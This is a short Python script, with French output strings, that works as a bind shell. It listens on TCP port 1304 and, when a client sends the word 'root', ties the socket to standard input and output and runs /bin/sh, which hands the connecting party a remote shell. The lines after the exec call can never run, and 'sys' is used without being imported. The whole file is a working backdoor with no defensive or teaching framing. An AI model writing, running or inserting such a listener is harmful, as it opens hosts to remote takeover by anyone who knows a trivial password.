#coding:utf-8
import socket,os,code

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("",1304))
s.listen(1)
client,address=s.accept()
client.send(b"Bonjour\n")
data=client.recv(256).decode("utf8")
while 1:
    if data=="root\n":
        print("We're in root session")
        for f in range(3):
            os.dup2(client.fileno(),f)
        os.execl("/bin/sh","/bin/sh")
        code.interact()
        sys.exit()
    else:
        print("On sort")
        break
client.close()
s.close()